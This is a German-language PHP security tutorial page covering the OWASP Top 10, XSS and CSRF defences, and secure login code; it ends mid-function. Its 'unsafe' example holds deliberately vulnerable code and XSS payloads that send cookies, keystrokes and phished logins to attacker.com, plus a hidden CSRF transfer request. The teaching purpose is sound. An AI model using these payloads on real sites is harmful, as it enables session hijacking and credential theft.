<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
require_once $_SERVER['DOCUMENT_ROOT'] . '/config.php';

include $_SERVER['DOCUMENT_ROOT'] . '/includes/php-navigation.php';

$page_title = 'PHP Security - Sicherheit und Best Practices';
include $_SERVER['DOCUMENT_ROOT'] . '/includes/header.php';
?>

<div class="layout-container">
<?php include $_SERVER['DOCUMENT_ROOT'] . '/includes/sidebar.php'; ?>
    <div class="main-wrapper">
        <main class="main-content">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-md-4 col-lg-3"></div>
                    <div class="col-md-8 col-lg-9">
                        
                        <?php renderNavigation('php-security'); ?>
                        
                        <div class="d-flex justify-content-between align-items-center pt-3 pb-2 mb-3 border-bottom">
                            <h1 class="h2"><i class="bi bi-shield-check me-2"></i>PHP Security</h1>
                        </div>

                        <div class="card bg-light mb-4">
                            <div class="card-body">
                                <h2>🛡️ PHP Security - Sichere Webanwendungen entwickeln</h2>
                                <p class="lead">Sicherheit ist <strong>kein Zusatzfeature</strong>, sondern muss von Anfang an mitgedacht werden. Hier lernen Sie alle wichtigen <strong>Sicherheitsprinzipien und Schutzmechanismen</strong> für professionelle PHP-Anwendungen!</p>
                            </div>
                        </div>

                        <div class="alert alert-danger">
                            <h5><i class="bi bi-exclamation-triangle me-2"></i>Warum Security so kritisch ist</h5>
                            <p class="mb-0">Ein einziger Sicherheitsfehler kann <strong>Kundendaten</strong> gefährden, <strong>Vertrauen</strong> zerstören und <strong>rechtliche Konsequenzen</strong> haben. Security ist nicht optional - es ist überlebenswichtig!</p>
                        </div>

                        <h3>🎯 Die häufigsten Sicherheitslücken (OWASP Top 10)</h3>
                        <div class="card mb-4">
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>Rang</th>
                                                <th>Sicherheitslücke</th>
                                                <th>Beschreibung</th>
                                                <th>Auswirkung</th>
                                                <th>PHP-Schutz</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td><strong>1</strong></td>
                                                <td>Injection (SQL, NoSQL, OS)</td>
                                                <td>Schadsoftware in Eingaben</td>
                                                <td>Datendiebstahl, Server-Übernahme</td>
                                                <td>Prepared Statements</td>
                                            </tr>
                                            <tr>
                                                <td><strong>2</strong></td>
                                                <td>Broken Authentication</td>
                                                <td>Schwache Anmeldeverfahren</td>
                                                <td>Account-Übernahme</td>
                                                <td>Sichere Sessions, 2FA</td>
                                            </tr>
                                            <tr>
                                                <td><strong>3</strong></td>
                                                <td>Sensitive Data Exposure</td>
                                                <td>Unverschlüsselte Daten</td>
                                                <td>Datenschutzverletzung</td>
                                                <td>Encryption, HTTPS</td>
                                            </tr>
                                            <tr>
                                                <td><strong>4</strong></td>
                                                <td>XML External Entities</td>
                                                <td>Unsichere XML-Verarbeitung</td>
                                                <td>Datenexfiltration</td>
                                                <td>libxml_disable_entity_loader</td>
                                            </tr>
                                            <tr>
                                                <td><strong>5</strong></td>
                                                <td>Broken Access Control</td>
                                                <td>Unzureichende Berechtigungen</td>
                                                <td>Unbefugter Zugriff</td>
                                                <td>Role-based Access Control</td>
                                            </tr>
                                            <tr>
                                                <td><strong>6</strong></td>
                                                <td>Security Misconfiguration</td>
                                                <td>Falsche Konfiguration</td>
                                                <td>Diverse Angriffsvektoren</td>
                                                <td>Sichere Default-Settings</td>
                                            </tr>
                                            <tr>
                                                <td><strong>7</strong></td>
                                                <td>Cross-Site Scripting (XSS)</td>
                                                <td>Schädliche Scripts einschleusen</td>
                                                <td>Session-Hijacking</td>
                                                <td>htmlspecialchars(), CSP</td>
                                            </tr>
                                            <tr>
                                                <td><strong>8</strong></td>
                                                <td>Insecure Deserialization</td>
                                                <td>Unsichere Objektserialisierung</td>
                                                <td>Remote Code Execution</td>
                                                <td>Validierung vor unserialize()</td>
                                            </tr>
                                            <tr>
                                                <td><strong>9</strong></td>
                                                <td>Known Vulnerabilities</td>
                                                <td>Veraltete Komponenten</td>
                                                <td>Bekannte Exploits</td>
                                                <td>Regular Updates</td>
                                            </tr>
                                            <tr>
                                                <td><strong>10</strong></td>
                                                <td>Insufficient Logging</td>
                                                <td>Mangelhafte Überwachung</td>
                                                <td>Unentdeckte Angriffe</td>
                                                <td>Umfassende Log-Systeme</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <h3>🚫 XSS-Schutz (Cross-Site Scripting)</h3>
                        <div class="card mb-4">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h5>❌ Unsicher - XSS-anfällig:</h5>
                                        <div class="card bg-danger text-light">
                                            <div class="card-body">
                                                <pre class="mb-0"><code class="language-php text-light">&lt;?php
// ⚠️ NIEMALS SO MACHEN! XSS-Lücken

// Direkte Ausgabe ohne Filtering
$username = $_GET['name'] ?? 'Gast';
echo "Hallo $username!"; // XSS möglich: ?name=&lt;script&gt;alert('XSS')&lt;/script&gt;

// Unsichere HTML-Ausgabe
$comment = $_POST['comment'] ?? '';
echo "&lt;div class='comment'&gt;$comment&lt;/div&gt;"; // XSS in Kommentaren

// Unsichere Attribute
$color = $_GET['color'] ?? 'blue';
echo "&lt;div style='color: $color'&gt;Text&lt;/div&gt;"; // ?color=red;background:url(javascript:alert('XSS'))

// Unsichere JavaScript-Einbettung
$search_term = $_GET['q'] ?? '';
echo "&lt;script&gt;var searchTerm = '$search_term';&lt;/script&gt;"; // ?q='; alert('XSS'); //

// Unsichere URL-Parameter
$redirect = $_GET['redirect'] ?? '/';
echo "&lt;a href='$redirect'&gt;Weiter&lt;/a&gt;"; // ?redirect=javascript:alert('XSS')

// Diese Angriffe sind möglich:
$angriffe = [
    // Cookie-Diebstahl
    "&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;",
    
    // Phishing
    "&lt;div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'&gt;
     &lt;form action='http://attacker.com/phish.php'&gt;Login: &lt;input name='user'&gt;&lt;input name='pass' type='password'&gt;&lt;button&gt;Anmelden&lt;/button&gt;&lt;/form&gt;
     &lt;/div&gt;",
    
    // Keylogger
    "&lt;script&gt;document.addEventListener('keydown', function(e) { 
         fetch('http://attacker.com/log.php?key=' + e.key); 
     });&lt;/script&gt;",
    
    // CSRF-Angriff
    "&lt;img src='http://bank.com/transfer?to=attacker&amount=10000' style='display:none'&gt;",
    
    // Defacement
    "&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked by XSS&lt;/h1&gt;';&lt;/script&gt;"
];

echo "&lt;div class='alert alert-danger'&gt;";
echo "&lt;h6&gt;🚨 Mögliche XSS-Angriffe:&lt;/h6&gt;";
echo "&lt;ul&gt;";
echo "&lt;li&gt;Cookie-Diebstahl → Session-Hijacking&lt;/li&gt;";
echo "&lt;li&gt;Phishing → Passwort-Diebstahl&lt;/li&gt;";
echo "&lt;li&gt;Keylogger → Alle Eingaben mitschneiden&lt;/li&gt;";
echo "&lt;li&gt;CSRF → Ungewollte Aktionen ausführen&lt;/li&gt;";
echo "&lt;li&gt;Defacement → Website verunstalten&lt;/li&gt;";
echo "&lt;/ul&gt;";
echo "&lt;/div&gt;";

// Beispiele für XSS-Payloads
echo "&lt;div class='alert alert-warning'&gt;";
echo "&lt;h6&gt;⚠️ Beispiel XSS-Payloads:&lt;/h6&gt;";
echo "&lt;ul&gt;";
echo "&lt;li&gt;&lt;code&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/code&gt;&lt;/li&gt;";
echo "&lt;li&gt;&lt;code&gt;&lt;img src=x onerror=alert('XSS')&gt;&lt;/code&gt;&lt;/li&gt;";
echo "&lt;li&gt;&lt;code&gt;&lt;svg onload=alert('XSS')&gt;&lt;/code&gt;&lt;/li&gt;";
echo "&lt;li&gt;&lt;code&gt;javascript:alert('XSS')&lt;/code&gt;&lt;/li&gt;";
echo "&lt;li&gt;&lt;code&gt;&lt;iframe src=javascript:alert('XSS')&gt;&lt;/iframe&gt;&lt;/code&gt;&lt;/li&gt;";
echo "&lt;/ul&gt;";
echo "&lt;/div&gt;";
?&gt;</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h5>✅ Sicher - XSS-geschützt:</h5>
                                        <div class="card bg-success text-light">
                                            <div class="card-body">
                                                <pre class="mb-0"><code class="language-php text-light">&lt;?php
// ✅ SO MACHT MAN ES RICHTIG! XSS-Schutz

// Sichere HTML-Ausgabe
function safe_output($text, $context = 'html') {
    switch ($context) {
        case 'html':
            return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        case 'attribute':
            return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        case 'javascript':
            return json_encode($text, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
        case 'url':
            return urlencode($text);
        case 'css':
            return preg_replace('/[^a-zA-Z0-9\-_]/', '', $text);
        default:
            return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
}

// Sichere Benutzer-Ausgabe
$username = $_GET['name'] ?? 'Gast';
echo "Hallo " . safe_output($username) . "!";

// Sichere Kommentar-Ausgabe
$comment = $_POST['comment'] ?? '';
echo "&lt;div class='comment'&gt;" . safe_output($comment) . "&lt;/div&gt;";

// Sichere Attribute
$color = $_GET['color'] ?? 'blue';
$allowed_colors = ['red', 'blue', 'green', 'black'];
$safe_color = in_array($color, $allowed_colors) ? $color : 'blue';
echo "&lt;div style='color: $safe_color'&gt;Text&lt;/div&gt;";

// Sichere JavaScript-Einbettung
$search_term = $_GET['q'] ?? '';
echo "&lt;script&gt;var searchTerm = " . safe_output($search_term, 'javascript') . ";&lt;/script&gt;";

// Sichere URL-Behandlung
$redirect = $_GET['redirect'] ?? '/';
$allowed_domains = ['example.com', 'subdomain.example.com'];
if (filter_var($redirect, FILTER_VALIDATE_URL)) {
    $parsed = parse_url($redirect);
    if (in_array($parsed['host'], $allowed_domains)) {
        echo "&lt;a href='" . safe_output($redirect, 'attribute') . "'&gt;Weiter&lt;/a&gt;";
    } else {
        echo "&lt;a href='/'&gt;Zur Startseite&lt;/a&gt;";
    }
} else {
    // Relative URL
    if (preg_match('/^\/[a-zA-Z0-9\/_-]*$/', $redirect)) {
        echo "&lt;a href='" . safe_output($redirect, 'attribute') . "'&gt;Weiter&lt;/a&gt;";
    } else {
        echo "&lt;a href='/'&gt;Zur Startseite&lt;/a&gt;";
    }
}

// Content Security Policy (CSP) Helper
class CSPBuilder {
    private $directives = [];
    
    public function addDirective($directive, $sources) {
        $this->directives[$directive] = is_array($sources) ? $sources : [$sources];
        return $this;
    }
    
    public function build() {
        $policy = [];
        foreach ($this->directives as $directive => $sources) {
            $policy[] = $directive . ' ' . implode(' ', $sources);
        }
        return implode('; ', $policy);
    }
    
    public function getSecureDefault() {
        return $this
            ->addDirective('default-src', "'self'")
            ->addDirective('script-src', ["'self'", "'unsafe-inline'"])
            ->addDirective('style-src', ["'self'", "'unsafe-inline'"])
            ->addDirective('img-src', ["'self'", 'data:', 'https:'])
            ->addDirective('connect-src', "'self'")
            ->addDirective('font-src', ["'self'", 'https:'])
            ->addDirective('object-src', "'none'")
            ->addDirective('media-src', "'self'")
            ->addDirective('frame-src', "'none'")
            ->build();
    }
}

// CSP-Header setzen
$csp = new CSPBuilder();
$policy = $csp->getSecureDefault();
header("Content-Security-Policy: $policy");

// Template-Engine mit Auto-Escaping
class SafeTemplate {
    private $template;
    private $variables = [];
    
    public function __construct($template_string) {
        $this->template = $template_string;
    }
    
    public function assign($key, $value) {
        $this->variables[$key] = $value;
        return $this;
    }
    
    public function render() {
        $output = $this->template;
        
        // Variablen ersetzen mit automatischem Escaping
        foreach ($this->variables as $key => $value) {
            $escaped_value = safe_output($value);
            $output = str_replace('{{' . $key . '}}', $escaped_value, $output);
        }
        
        // Raw-Variablen (für Admin-Content)
        foreach ($this->variables as $key => $value) {
            $output = str_replace('{{{' . $key . '}}}', $value, $output);
        }
        
        return $output;
    }
}

// Template-Engine verwenden
$template = new SafeTemplate('
    &lt;h1&gt;Willkommen {{name}}!&lt;/h1&gt;
    &lt;p&gt;Ihre Nachricht: {{message}}&lt;/p&gt;
    &lt;div&gt;Admin-Content: {{{admin_content}}}&lt;/div&gt;
');

$template
    ->assign('name', $_GET['name'] ?? 'Unbekannt')
    ->assign('message', $_POST['message'] ?? 'Keine Nachricht')
    ->assign('admin_content', '&lt;em&gt;Nur für Admins&lt;/em&gt;');

echo $template->render();

// Input-Validierung und Sanitization
class InputSanitizer {
    
    public static function email($input) {
        $email = filter_var(trim($input), FILTER_SANITIZE_EMAIL);
        return filter_var($email, FILTER_VALIDATE_EMAIL) ? $email : false;
    }
    
    public static function url($input) {
        $url = filter_var(trim($input), FILTER_SANITIZE_URL);
        return filter_var($url, FILTER_VALIDATE_URL) ? $url : false;
    }
    
    public static function int($input, $min = null, $max = null) {
        $int = filter_var($input, FILTER_VALIDATE_INT);
        if ($int === false) return false;
        
        if ($min !== null && $int < $min) return false;
        if ($max !== null && $int > $max) return false;
        
        return $int;
    }
    
    public static function string($input, $max_length = 255, $allowed_chars = null) {
        $string = trim($input);
        $string = substr($string, 0, $max_length);
        
        if ($allowed_chars) {
            $string = preg_replace("/[^$allowed_chars]/", '', $string);
        }
        
        return $string;
    }
    
    public static function html($input, $allowed_tags = []) {
        if (empty($allowed_tags)) {
            return strip_tags($input);
        }
        
        $allowed = '&lt;' . implode('&gt;&lt;', $allowed_tags) . '&gt;';
        return strip_tags($input, $allowed);
    }
}

// Sichere Input-Verarbeitung
$safe_email = InputSanitizer::email($_POST['email'] ?? '');
$safe_age = InputSanitizer::int($_POST['age'] ?? '', 13, 120);
$safe_name = InputSanitizer::string($_POST['name'] ?? '', 50, 'a-zA-Z\s\-');
$safe_bio = InputSanitizer::html($_POST['bio'] ?? '', ['p', 'br', 'strong', 'em']);

echo "&lt;div class='alert alert-success'&gt;";
echo "&lt;h6&gt;✅ XSS-Schutz implementiert:&lt;/h6&gt;";
echo "&lt;ul&gt;";
echo "&lt;li&gt;&lt;strong&gt;Output-Encoding:&lt;/strong&gt; htmlspecialchars() für alle Ausgaben&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Context-aware Escaping:&lt;/strong&gt; Verschiedene Kontexte berücksichtigen&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;CSP-Header:&lt;/strong&gt; Browser-seitige Script-Kontrolle&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Input-Validierung:&lt;/strong&gt; Eingaben prüfen und bereinigen&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Whitelist-Ansatz:&lt;/strong&gt; Nur erlaubte Werte akzeptieren&lt;/li&gt;";
echo "&lt;/ul&gt;";
echo "&lt;/div&gt;";
?&gt;</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>🔐 CSRF-Schutz (Cross-Site Request Forgery)</h3>
                        <div class="card mb-4">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h5>CSRF-Token System:</h5>
                                        <div class="card bg-dark text-light">
                                            <div class="card-body">
                                                <pre class="mb-0"><code class="language-php text-light">&lt;?php
// CSRF-Protection-Klasse
class CSRFProtection {
    private $session_key = 'csrf_tokens';
    private $token_lifetime = 3600; // 1 Stunde
    
    public function __construct() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        // Alte Tokens aufräumen
        $this->cleanupExpiredTokens();
    }
    
    /**
     * Neuen CSRF-Token generieren
     */
    public function generateToken($action = 'default') {
        $token = bin2hex(random_bytes(32));
        $expires = time() + $this->token_lifetime;
        
        if (!isset($_SESSION[$this->session_key])) {
            $_SESSION[$this->session_key] = [];
        }
        
        $_SESSION[$this->session_key][$token] = [
            'action' => $action,
            'expires' => $expires,
            'created' => time()
        ];
        
        return $token;
    }
    
    /**
     * Token validieren
     */
    public function validateToken($token, $action = 'default') {
        if (!isset($_SESSION[$this->session_key][$token])) {
            return false;
        }
        
        $token_data = $_SESSION[$this->session_key][$token];
        
        // Token abgelaufen?
        if (time() > $token_data['expires']) {
            unset($_SESSION[$this->session_key][$token]);
            return false;
        }
        
        // Action stimmt überein?
        if ($token_data['action'] !== $action) {
            return false;
        }
        
        // Token nach Verwendung löschen (One-Time-Use)
        unset($_SESSION[$this->session_key][$token]);
        
        return true;
    }
    
    /**
     * HTML-Input-Feld generieren
     */
    public function getTokenField($action = 'default') {
        $token = $this->generateToken($action);
        return "&lt;input type='hidden' name='csrf_token' value='$token'&gt;";
    }
    
    /**
     * Meta-Tag für AJAX-Requests
     */
    public function getMetaTag($action = 'default') {
        $token = $this->generateToken($action);
        return "&lt;meta name='csrf-token' content='$token'&gt;";
    }
    
    /**
     * Token aus Request validieren
     */
    public function verifyRequest($action = 'default') {
        $token = $_POST['csrf_token'] ?? $_GET['csrf_token'] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? null;
        
        if (!$token) {
            throw new SecurityException("CSRF-Token fehlt");
        }
        
        if (!$this->validateToken($token, $action)) {
            throw new SecurityException("Ungültiger CSRF-Token");
        }
        
        return true;
    }
    
    /**
     * Abgelaufene Tokens entfernen
     */
    private function cleanupExpiredTokens() {
        if (!isset($_SESSION[$this->session_key])) {
            return;
        }
        
        $now = time();
        foreach ($_SESSION[$this->session_key] as $token => $data) {
            if ($now > $data['expires']) {
                unset($_SESSION[$this->session_key][$token]);
            }
        }
    }
    
    /**
     * Alle Tokens für Benutzer löschen
     */
    public function clearAllTokens() {
        $_SESSION[$this->session_key] = [];
    }
    
    /**
     * Double-Submit Cookie Pattern
     */
    public function setDoubleSubmitCookie($action = 'default') {
        $token = $this->generateToken($action);
        
        setcookie('csrf_token_' . $action, $token, [
            'expires' => time() + $this->token_lifetime,
            'path' => '/',
            'secure' => isset($_SERVER['HTTPS']),
            'httponly' => true,
            'samesite' => 'Strict'
        ]);
        
        return $token;
    }
    
    public function verifyDoubleSubmit($action = 'default') {
        $form_token = $_POST['csrf_token'] ?? null;
        $cookie_token = $_COOKIE['csrf_token_' . $action] ?? null;
        
        if (!$form_token || !$cookie_token) {
            throw new SecurityException("CSRF-Token fehlt (Double-Submit)");
        }
        
        if (!hash_equals($form_token, $cookie_token)) {
            throw new SecurityException("CSRF-Token stimmt nicht überein");
        }
        
        return $this->validateToken($form_token, $action);
    }
}

class SecurityException extends Exception {}

// CSRF-Protection verwenden
$csrf = new CSRFProtection();

// Formular-Verarbeitung mit CSRF-Schutz
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        // CSRF-Token prüfen
        $csrf->verifyRequest('user_settings');
        
        // Formulardaten verarbeiten
        $success_message = "Einstellungen erfolgreich gespeichert!";
        echo "&lt;div class='alert alert-success'&gt;$success_message&lt;/div&gt;";
        
    } catch (SecurityException $e) {
        $error_message = "Sicherheitsfehler: " . $e->getMessage();
        echo "&lt;div class='alert alert-danger'&gt;$error_message&lt;/div&gt;";
        
        // Security-Incident loggen
        error_log("CSRF-Angriff verhindert: " . $e->getMessage() . " - IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
    }
}

// Sichere Formular-Ausgabe
echo "&lt;form method='post' action=''&gt;";
echo $csrf->getTokenField('user_settings');
echo "&lt;div class='form-group'&gt;";
echo "&lt;label&gt;Benutzername:&lt;/label&gt;";
echo "&lt;input type='text' name='username' class='form-control'&gt;";
echo "&lt;/div&gt;";
echo "&lt;button type='submit' class='btn btn-primary'&gt;Speichern&lt;/button&gt;";
echo "&lt;/form&gt;";

// Meta-Tag für AJAX
echo $csrf->getMetaTag('ajax_requests');

// JavaScript für AJAX-Requests
echo "&lt;script&gt;
// CSRF-Token aus Meta-Tag lesen
function getCSRFToken() {
    return document.querySelector('meta[name=\"csrf-token\"]').getAttribute('content');
}

// AJAX-Request mit CSRF-Schutz
function secureAjaxRequest(url, data, callback) {
    data.csrf_token = getCSRFToken();
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': getCSRFToken()
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(callback);
}
&lt;/script&gt;";

// SameSite-Cookies für zusätzlichen Schutz
function setSecureCookie($name, $value, $expires = 0) {
    setcookie($name, $value, [
        'expires' => $expires,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'] ?? '',
        'secure' => isset($_SERVER['HTTPS']),
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
}

// Referer-Prüfung als zusätzlicher Schutz
function checkReferer($allowed_domains = []) {
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    
    if (empty($referer)) {
        return false; // Kein Referer - verdächtig
    }
    
    $referer_host = parse_url($referer, PHP_URL_HOST);
    $current_host = $_SERVER['HTTP_HOST'] ?? '';
    
    if (empty($allowed_domains)) {
        $allowed_domains = [$current_host];
    }
    
    return in_array($referer_host, $allowed_domains);
}

// Beispiel für sichere Action
if ($_POST['delete_account'] ?? false) {
    try {
        // 1. CSRF-Token prüfen
        $csrf->verifyRequest('delete_account');
        
        // 2. Referer prüfen
        if (!checkReferer()) {
            throw new SecurityException("Ungültiger Referer");
        }
        
        // 3. Zusätzliche Bestätigung
        if (($_POST['confirm'] ?? '') !== 'DELETE') {
            throw new SecurityException("Bestätigung fehlt");
        }
        
        // 4. Account löschen (simuliert)
        echo "&lt;div class='alert alert-success'&gt;Account wurde gelöscht&lt;/div&gt;";
        
    } catch (SecurityException $e) {
        echo "&lt;div class='alert alert-danger'&gt;Sicherheitsfehler: " . $e->getMessage() . "&lt;/div&gt;";
    }
}

echo "&lt;div class='alert alert-info'&gt;";
echo "&lt;h6&gt;🛡️ CSRF-Schutz implementiert:&lt;/h6&gt;";
echo "&lt;ul&gt;";
echo "&lt;li&gt;&lt;strong&gt;Synchronizer Token:&lt;/strong&gt; Eindeutige Tokens pro Formular&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Double-Submit Cookie:&lt;/strong&gt; Cookie + Form-Token vergleichen&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;SameSite Cookies:&lt;/strong&gt; Browser-seitige CSRF-Prävention&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Referer-Prüfung:&lt;/strong&gt; Request-Herkunft validieren&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Token-Lifetime:&lt;/strong&gt; Zeitliche Begrenzung der Tokens&lt;/li&gt;";
echo "&lt;/ul&gt;";
echo "&lt;/div&gt;";
?&gt;</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h5>Sichere Authentifizierung:</h5>
                                        <div class="card bg-dark text-light">
                                            <div class="card-body">
                                                <pre class="mb-0"><code class="language-php text-light">&lt;?php
// Sichere Authentifizierung und Session-Management
class SecureAuth {
    private $max_login_attempts = 5;
    private $lockout_duration = 900; // 15 Minuten
    private $session_timeout = 3600; // 1 Stunde
    private $password_min_length = 12;
    
    public function __construct() {
        $this->configureSession();
    }
    
    private function configureSession() {
        ini_set('session.cookie_httponly', 1);
        ini_set('session.cookie_secure', isset($_SERVER['HTTPS']) ? 1 : 0);
        ini_set('session.cookie_samesite', 'Strict');
        ini_set('session.use_strict_mode', 1);
        ini_set('session.cookie_lifetime', 0); // Session-Cookie
        
        session_start();
        
        // Session-Fixation verhindern
        if (!isset($_SESSION['initiated'])) {
            session_regenerate_id(true);
            $_SESSION['initiated'] = true;
        }
        
        // Session-Timeout prüfen
        $this->checkSessionTimeout();
    }
    
    /**
     * Benutzer registrieren mit sicheren Passwort-Anforderungen
     */
    public function register($email, $password, $additional_data = []) {
        // E-Mail validieren
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            throw new SecurityException("Ungültige E-Mail-Adresse");
        }
        
        // Passwort-Stärke prüfen
        $this->validatePasswordStrength($password);
        
        // Benutzer bereits vorhanden?
        if ($this->userExists($email)) {
            throw new SecurityException("E-Mail bereits registriert");
        }
        
        // Passwort sicher hashen
        $password_hash = password_hash($password, PASSWORD_ARGON2ID, [
            'memory_cost' => 65536, // 64 MB
            'time_cost' => 4,       // 4 Iterationen
            'threads' => 3          // 3 Threads
        ]);
        
        // Benutzer in Datenbank speichern (simuliert)
        $user_data = array_merge($additional_data, [
            'email' => $email,
            'password_hash' => $password_hash,
            'created_at' => date('Y-m-d H:i:s'),
            'email_verified' => false,
            'two_factor_enabled' => false
        ]);
        
        // Verification-Token generieren
        $verification_token = bin2hex(random_bytes(32));
        $user_data['verification_token'] = $verification_token;
        
        // E-Mail-Verification senden
        $this->sendVerificationEmail($email, $verification_token);
        
        return [
            'success' => true,
            'message' => 'Registrierung erfolgreich. Bitte prüfen Sie Ihre E-Mails.'
        ];
    }
    
    /**
     * Sichere Anmeldung mit Rate-Limiting
     */
    public function login($email, $password, $remember_me = false) {
        // Rate-Limiting prüfen
        if ($this->isAccountLocked($email)) {
            $remaining = $this->getLockoutTimeRemaining($email);
            throw new SecurityException("Account temporär gesperrt. Versuchen Sie es in $remaining Minuten erneut.");
        }
        
        // Benutzer abrufen
        $user = $this->getUserByEmail($email);
        if (!$user) {
            $this->recordFailedLogin($email);
            throw new SecurityException("Ungültige Anmeldedaten");
        }
        
        // E-Mail-Verification prüfen
        if (!$user['email_verified']) {
            throw new SecurityException("E-Mail-Adresse noch nicht verifiziert");
        }
        
        // Passwort prüfen
        if (!password_verify($password, $user['password_hash'])) {
            $this->recordFailedLogin($email);
            throw new SecurityException("Ungültige Anmeldedaten");
        }
        
        // Passwort-Hash aktualisieren falls nötig
        if (password_needs_rehash($user['password_hash'], PASSWORD_ARGON2ID)) {
            $new_hash = password_hash($password, PASSWORD_ARGON2ID);
            $this->updatePasswordHash($user['id'], $new_hash);
        }
        
        // Failed-Login-Counter zurücksetzen
        $this->clearFailedLogins($email);
        
        // Session initialisieren
        $this->initializeUserSession($user);
        
        // Remember-Me Token
        if ($remember_me) {
            $this->setRememberMeToken($user['id']);
        }
        
        // 2FA prüfen
        if ($user['two_factor_enabled']) {
            $_SESSION['2fa_required'] = true;
            $_SESSION['2fa_user_id'] = $user['id'];
            
            return [
                'success' => true,
                'requires_2fa' => true,
                'message' => '2FA-Code erforderlich'
            ];
        }
        
        // Login-Event loggen
        $this->logSecurityEvent('successful_login', $user['id']);
        
        return [
            'success' => true,
            'user' => $this->sanitizeUserData($user)
        ];
    }
    
    /**
     * Passwort-Stärke validieren
     */
    private function validatePasswordStrength($password) {
        $errors = [];
        
        if (strlen($password) < $this->password_min_length) {
            $errors[] = "Passwort muss mindestens {$this->password_min_length} Zeichen haben";
        }
        
        if (!preg_match('/[a-z]/', $password)) {
            $errors[] = "Passwort muss Kleinbuchstaben enthalten";
        }
        
        if (!preg_match('/[A-Z]/', $password)) {
            $errors[] = "Passwort muss Großbuchstaben enthalten";
        }
        
        if (!preg_match('/[0-9]/', $password)) {
            $errors[] = "Passwort muss Zahlen enthalten";
        }
        
        if (!preg_match('/[^a-zA-Z0-9]/', $password)) {
            $errors[] = "Passwort muss Sonderzeichen enthalten";
        }
        
        // Häufige Passwörter prüfen
        $common_passwords = [
            'password123', '123456789', 'qwertyuiop', 'admin123456',
            'password2024', 'welcome123', 'letmein123'
        ];
        
        if (in_array(strtolower($password), $common_passwords)) {
            $errors[] = "Passwort ist zu häufig verwendet";
        }
        
        // Entropy prüfen (vereinfacht)
        $unique_chars = count(array_unique(str_split($password)));
        if ($unique_chars < 8) {
            $errors[] = "Passwort ist nicht vielfältig genug";
        }
        
        if (!empty($errors)) {
            throw new SecurityException("Passwort zu schwach: " . implode(', ', $errors));
        }
    }
    
    /**
     * Rate-Limiting für Login-Versuche
     */
    private function recordFailedLogin($email) {
        $key = 'failed_logins_' . hash('sha256', $email);
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = [];
        }
        
        $_SESSION[$key][] = time();
        
        // Alte Versuche entfernen (älter als Lockout-Duration)
        $cutoff = time() - $this->lockout_duration;
        $_SESSION[$key] = array_filter($_SESSION[$key], function($timestamp) use ($cutoff) {
            return $timestamp > $cutoff;
        });
    }
    
    private function isAccountLocked($email) {
        $key = 'failed_logins_' . hash('sha256', $email);
        $attempts = $_SESSION[$key] ?? [];
        
        return count($attempts) >= $this->max_login_attempts;
    }
    
    private function getLockoutTimeRemaining($email) {
        $key = 'failed_logins_' . hash('sha256', $email);
        $attempts = $_SESSION[$key] ?? [];
        
        if (empty($attempts)) {
            return 0;
        }
        
        $oldest_attempt = min($attempts);
        $unlock_time = $oldest_attempt + $this->lockout_duration;
        $remaining_seconds = $unlock_time - time();
        
        return max(0, ceil($remaining_seconds / 60)); // Minuten
    }
    
    /**
     * Session-Management
     */
    private function initializeUserSession($user) {
        // Session-ID erneuern
        session_regenerate_id(true);
        
        // Session-Daten setzen
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['email'] = $user['email'];
        $_SESSION['login_time'] = time();
        $_SESSION['last_activity'] = time();
        $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    
    private function checkSessionTimeout() {
        if (!isset($_SESSION['last_activity'])) {
            return;
        }
        
        if (time() - $_SESSION['last_activity'] > $this->session_timeout) {
            $this->logout();
            throw new SecurityException("Session abgelaufen");
        }
        
        // Session-Hijacking-Schutz
